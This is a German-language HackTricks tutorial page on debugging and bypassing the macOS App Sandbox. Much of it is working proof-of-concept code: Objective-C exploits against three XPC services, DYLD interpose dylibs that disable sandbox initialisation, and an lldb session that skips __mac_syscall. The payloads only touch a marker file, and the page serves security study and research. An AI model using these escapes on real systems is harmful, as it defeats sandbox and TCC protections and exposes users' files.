# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox-Ladeprozess

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Bild von <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Im vorherigen Bild ist es möglich zu beobachten, **wie der Sandbox geladen wird**, wenn eine Anwendung mit dem Recht **`com.apple.security.app-sandbox`** ausgeführt wird.

Der Compiler verlinkt `/usr/lib/libSystem.B.dylib` mit der Binärdatei.

Dann wird **`libSystem.B`** mehrere andere Funktionen aufrufen, bis die **`xpc_pipe_routine`** die Berechtigungen der App an **`securityd`** sendet. Securityd überprüft, ob der Prozess innerhalb der Sandbox quarantiniert werden soll, und wenn ja, wird er quarantiniert.\
Schließlich wird die Sandbox mit einem Aufruf von **`__sandbox_ms`** aktiviert, der **`__mac_syscall`** aufruft.

## Mögliche Umgehungen

### Umgehung des Quarantäneattributs

**Dateien, die von sandboxed Prozessen erstellt werden**, erhalten das **Quarantäneattribut**, um ein Entkommen aus der Sandbox zu verhindern. Wenn es Ihnen jedoch gelingt, **einen `.app`-Ordner ohne das Quarantäneattribut** innerhalb einer sandboxed Anwendung zu erstellen, könnten Sie die App-Bundle-Binärdatei auf **`/bin/bash`** verweisen lassen und einige Umgebungsvariablen in der **plist** hinzufügen, um **`open`** zu missbrauchen, um **die neue App unsandboxed zu starten**.

Das wurde in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

> [!CAUTION]
> Daher können Sie im Moment, wenn Sie nur in der Lage sind, einen Ordner mit einem Namen zu erstellen, der auf **`.app`** endet, ohne ein Quarantäneattribut, die Sandbox umgehen, da macOS nur das **Quarantäne**-Attribut im **`.app`-Ordner** und in der **Hauptausführungsdatei** überprüft (und wir werden die Hauptausführungsdatei auf **`/bin/bash`** verweisen).
>
> Beachten Sie, dass, wenn ein .app-Bundle bereits autorisiert wurde, um ausgeführt zu werden (es hat ein Quarantäne-xttr mit dem autorisierten Ausführungsflag), Sie es auch missbrauchen könnten... es sei denn, Sie können jetzt nicht in **`.app`**-Bundles schreiben, es sei denn, Sie haben einige privilegierte TCC-Berechtigungen (die Sie in einer Sandbox nicht haben werden).

### Missbrauch der Open-Funktionalität

In den [**letzten Beispielen für die Umgehung der Word-Sandbox**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) kann man sehen, wie die **`open`**-CLI-Funktionalität missbraucht werden könnte, um die Sandbox zu umgehen.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Selbst wenn eine Anwendung **für die Sandbox vorgesehen ist** (`com.apple.security.app-sandbox`), ist es möglich, die Sandbox zu umgehen, wenn sie **von einem LaunchAgent** (`~/Library/LaunchAgents`) ausgeführt wird, zum Beispiel.\
Wie in [**diesem Beitrag**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) erklärt, wenn Sie mit einer sandboxed Anwendung Persistenz erreichen möchten, könnten Sie sie automatisch als LaunchAgent ausführen lassen und möglicherweise schädlichen Code über DyLib-Umgebungsvariablen injizieren.

### Missbrauch von Auto-Start-Standorten

Wenn ein sandboxed Prozess in einem Ort **schreiben** kann, wo **später eine unsandboxed Anwendung die Binärdatei ausführen wird**, kann er **einfach entkommen, indem er** dort die Binärdatei platziert. Ein gutes Beispiel für solche Standorte sind `~/Library/LaunchAgents` oder `/System/Library/LaunchDaemons`.

Dafür benötigen Sie möglicherweise sogar **2 Schritte**: Um einen Prozess mit einer **weniger restriktiven Sandbox** (`file-read*`, `file-write*`) auszuführen, der Ihren Code ausführt, der tatsächlich an einem Ort schreiben wird, wo er **unsandboxed ausgeführt wird**.

Überprüfen Sie diese Seite über **Auto-Start-Standorte**:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Missbrauch anderer Prozesse

Wenn Sie von dem sandboxed Prozess aus in der Lage sind, **andere Prozesse zu kompromittieren**, die in weniger restriktiven Sandboxes (oder gar keiner) laufen, werden Sie in der Lage sein, in deren Sandboxes zu entkommen:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Verfügbare System- und Benutzer-Mach-Dienste

Die Sandbox erlaubt auch die Kommunikation mit bestimmten **Mach-Diensten** über XPC, die im Profil `application.sb` definiert sind. Wenn Sie in der Lage sind, einen dieser Dienste zu **missbrauchen**, könnten Sie in der Lage sein, die **Sandbox zu umgehen**.

Wie in [diesem Bericht](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) angegeben, werden die Informationen über Mach-Dienste in `/System/Library/xpc/launchd.plist` gespeichert. Es ist möglich, alle System- und Benutzer-Mach-Dienste zu finden, indem man in dieser Datei nach `<string>System</string>` und `<string>User</string>` sucht.

Darüber hinaus ist es möglich zu überprüfen, ob ein Mach-Dienst für eine sandboxed Anwendung verfügbar ist, indem man `bootstrap_look_up` aufruft:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Verfügbare PID Mach-Dienste

Diese Mach-Dienste wurden zunächst missbraucht, um [aus dem Sandbox in diesem Bericht zu entkommen](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Zu diesem Zeitpunkt waren **alle XPC-Dienste, die** von einer Anwendung und ihrem Framework benötigt wurden, im PID-Domain der App sichtbar (das sind Mach-Dienste mit `ServiceType` als `Application`).

Um einen **PID-Domain XPC-Dienst** zu kontaktieren, muss er einfach innerhalb der App mit einer Zeile wie dieser registriert werden:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Darüber hinaus ist es möglich, alle **Application** Mach-Dienste zu finden, indem man in `System/Library/xpc/launchd.plist` nach `<string>Application</string>` sucht.

Eine weitere Möglichkeit, gültige xpc-Dienste zu finden, besteht darin, die in:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Mehrere Beispiele, die diese Technik ausnutzen, sind im [**originalen Bericht**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) zu finden, jedoch sind die folgenden einige zusammengefasste Beispiele.

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Dieser Dienst erlaubt jede XPC-Verbindung, indem er immer `YES` zurückgibt, und die Methode `runTask:arguments:withReply:` führt einen beliebigen Befehl mit beliebigen Parametern aus.

Der Exploit war "so einfach wie":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Dieser XPC-Dienst erlaubte jedem Client, indem er immer YES zurückgab, und die Methode `createZipAtPath:hourThreshold:withReply:` erlaubte im Grunde, den Pfad zu einem Ordner anzugeben, der komprimiert werden sollte, und er komprimierte ihn in eine ZIP-Datei.

Daher ist es möglich, eine gefälschte App-Ordnerstruktur zu erstellen, sie zu komprimieren, dann zu dekomprimieren und auszuführen, um den Sandbox zu verlassen, da die neuen Dateien nicht das Quarantäneattribut haben.

Der Exploit war:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Dieser XPC-Dienst ermöglicht es, Lese- und Schreibzugriff auf eine beliebige URL für den XPC-Client über die Methode `extendAccessToURL:completion:` zu gewähren, die jede Verbindung akzeptiert. Da der XPC-Dienst FDA hat, ist es möglich, diese Berechtigungen auszunutzen, um TCC vollständig zu umgehen.

Der Exploit war:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Statische Kompilierung & Dynamisches Verlinken

[**Diese Forschung**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) entdeckte 2 Möglichkeiten, die Sandbox zu umgehen. Da die Sandbox aus dem Userland angewendet wird, wenn die **libSystem**-Bibliothek geladen wird. Wenn ein Binary das Laden dieser Bibliothek vermeiden könnte, würde es niemals in die Sandbox gelangen:

- Wenn das Binary **vollständig statisch kompiliert** wäre, könnte es das Laden dieser Bibliothek vermeiden.
- Wenn das **Binary keine Bibliotheken laden müsste** (da der Linker ebenfalls in libSystem ist), müsste es libSystem nicht laden.

### Shellcodes

Beachten Sie, dass **sogar Shellcodes** in ARM64 in `libSystem.dylib` verlinkt werden müssen:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Nicht vererbte Einschränkungen

Wie im **[Bonus dieses Berichts](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** erklärt, eine Sandbox-Einschränkung wie:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
kann umgangen werden, indem ein neuer Prozess ausgeführt wird, zum Beispiel:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Allerdings wird dieser neue Prozess natürlich keine Berechtigungen oder Privilegien vom übergeordneten Prozess erben.

### Berechtigungen

Beachten Sie, dass einige **Aktionen** möglicherweise **durch den Sandbox** erlaubt sind, wenn eine Anwendung eine spezifische **Berechtigung** hat, wie zum Beispiel:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Für weitere Informationen über **Interposting** siehe:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer`, um die Sandbox zu verhindern
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall`, um den Sandbox zu verhindern
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debuggen & Umgehen des Sandboxes mit lldb

Lass uns eine Anwendung kompilieren, die im Sandbox-Modus laufen sollte:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Dann kompilieren Sie die App:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Die App wird versuchen, die Datei **`~/Desktop/del.txt`** zu **lesen**, was der **Sandbox nicht erlaubt**.\
> Erstellen Sie eine Datei dort, da die Sandbox, sobald sie umgangen ist, in der Lage sein wird, sie zu lesen:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Lassen Sie uns die Anwendung debuggen, um zu sehen, wann die Sandbox geladen wird:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Selbst wenn der Sandbox umgangen wird,** wird TCC den Benutzer fragen, ob er dem Prozess erlauben möchte, Dateien vom Desktop zu lesen.

## References

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
